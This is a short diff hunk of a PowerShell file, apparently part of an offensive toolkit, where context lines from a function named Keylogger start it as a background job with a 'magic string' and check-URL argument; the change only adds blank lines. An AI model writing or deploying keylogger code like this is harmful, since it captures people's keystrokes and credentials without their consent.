@@ -387,3 +387,5 @@ function script:Keylogger
             start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
     }
+
+
